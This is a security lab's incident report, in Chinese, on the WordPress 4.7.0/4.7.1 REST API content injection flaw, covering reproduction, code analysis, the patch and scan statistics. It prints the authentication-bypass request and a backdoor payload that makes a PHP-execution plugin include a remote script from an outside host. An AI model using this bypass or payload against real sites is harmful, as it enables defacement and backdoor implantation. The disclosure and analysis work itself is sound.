**PDF 版报告下载** ：[WordPress REST API
内容注入漏洞事件分析报告](http://paper.seebug.org/papers/Archive/Wordpress%20REST%20APIl%E5%86%85%E5%AE%B9%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A.pdf)
**English Version：**[WordPress REST API Content Injection Vulnerability
Incident Analysis
Report](http://paper.seebug.org/papers/Archive/WordPress%20REST%20API%20Content%20Injection%20Vulnerability%20Incident%20Analysis.pdf)
作者： **知道创宇404安全实验室**
报告发布日期：2017年02月28日
### 一、事件概述
#### 1 漏洞简介：
WordPress是一个以PHP和MySQL为平台的自由开源的博客软件和内容管理系统。在4.7.0版本后，REST API插件的功能被集成到
WordPress 中，由此也引发了一些安全性问题。近日，一个由 REST API 引起的影响 WordPress
4.7.0和4.7.1版本的漏洞被披露，该漏洞可以导致 WordPress 所有文章内容可以未经验证被查看，修改，删除，甚至创建新的文章，危害巨大。
在2017年2月11日，经过知道创宇404安全实验室使用 ZoomEye
网络空间探测引擎进行扫描探测后发现，受该漏洞影响的网站仍然有15361个，其中有9338个网站已经被黑客入侵并留下了组织代号。我们针对组织代号进行统计，发现共出现了八十余种代号。
我们使用 ZoomEye 网络空间搜索引擎搜索 `"app:WordPress ver:4.7.1"` ，获得36603条结果。以下是
https://www.zoomeye.org/search?t=web&q=app%3AWordPress+ver%3A4.7.1 的搜索结果：
#### 2 漏洞影响：
导致 WordPress 所有文章内容可以未经验证被查看，修改，删除，甚至创建新的文章，危害巨大。
#### 3影响版本：
  * WordPress 4.7.0
  * WordPress 4.7.1
### 二、时间线
### 三、漏洞验证与分析
PoC：
[Seebug](https://www.seebug.org/vuldb/ssvid-92637) 上已经给出详细的复现过程，在复现过程中可以使用
Seebug 收录的 PoC 来进行测试。 https://www.seebug.org/vuldb/ssvid-92637
漏洞验证扫描插件： Seebug 已经更新了 WordPress REST API 内容注入漏洞的扫描插件。 (
https://www.seebug.org/monster/ )
#### (1)在此给出简单的复现过程：
安装 WordPress存在漏洞版本并配置 REST API ，配置 Apache+PHP+Mysql 的运行环境。加载 Apache 的 rewrite
模块以及主配置文件配置如下图：
设置 WordPress 站点为固定链接：
1\. 构造数据包可看到不带任何验证信息会提示不允许编辑文章：
2\. 构造可利用的数据包，当 url 为 /wp-json/wp/v2/posts/1?id=1a 时可以看到成功跳过验证看到文章内容：
木马后门插入：
需要安装如 `insert_php` ， `exec_php` 等允许页面执行PHP 代码的插件。 可以构造数据包如下：
    content:"[insert_php] include('http[:]//acommeamour.fr/tmp/xx.php'); [/insert_php][php] include('http[:]//acommeamour.fr/tmp/xx.php'); [/php]","id":"61a"}
上传后木马后门被插件当做 PHP 代码执行，网站被植入后门。
#### （2）漏洞分析：
paper 已经发表了关于此漏洞的详细分析，以此作为参考。(http://paper.seebug.org/208/ )
首先，在 `./wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php` 中
这里对路由进行了正则限制，防止攻击者恶意构造 id 值，但是我们可以发现 `$get` 和 `$post` 值优先于路由正则表达式生成的值。
接下来在 `update_item` 方法及其权限检查函数`update_item_permissions_check` 中：
可以看出当我们发送一个没有响应文章的 id 时，就可以通过权限检查并允许继续执行对 `update_item` 方法的请求。具体到代码就是让 `$post`
为空来绕过权限检查。
那么怎么让 `$post` 为空呢？跟进到 `get_post` 方法发现其使用 `wp_posts` 中的 `get_instance`
静态方法获取文章：
当我们传入的id 不是全由数字字符组成时返回 false，从而 `get_post` 方法返回null，接着绕过权限检查。 回头再看可执行方法
`upload_item`：
这里 `$id` 这个参数做了类型转化传递给 `get_post` 。而PHP类型转换时会出现这种情况：
也就是说攻击者发起 `/wp-json/wp/v2/posts/1?id=1hhh` 的请求就是发起了对id 为1的文章的请求。
#### （3）漏洞修复：
在 `/wp-includes/class-wp-post.php` 中：
更改了对于 $post_id 的参数的传入顺序和判断条件，防止了我们传入“数字+字母”这样的格式进行绕过。
### 四、漏洞影响分布
**第一次扫描探测结果：**
我们于 2017/02/11 对全球的 WordPress 网站进行了扫描探测，发现当时仍旧受影响的 WordPress 网站共有 15361个。
这些网站分别归属于82个国家与地区，其中 Top20 国家与地区分布如下图：
**第二次扫描探测结果：**
我们于 2017/02/14 对全球的 WordPress 网站再次进行了扫描探测，获取最新数据如下：
现存漏洞站数量：13390 个，与 2017/02/11 数据对比减少了1971 个。 其中数据重合量为12584 个，网站新增量为 806
个，存在代码执行插件的网站数量为 905 个。
**第三次扫描探测结果：**
我们于 2017/02/20 对全球 WordPress 网站进行了第三次扫描探测。
根据第三次得到的数据，我们发现全球依旧存在漏洞的 WordPress
网站数量为11573个，其中与第二次数据重合量为11182个，新增数量为391个，消失数量为2208个，存在代码执行插件的网站数量为69个。
**三次扫描探测数据对比：**
分析上图，我们发现：
  1. 存在漏洞且一直未修复的网站基数还是很大。
  2. 存在允许代码执行插件的漏洞网站数量不多，对现存漏洞网站影响不大。 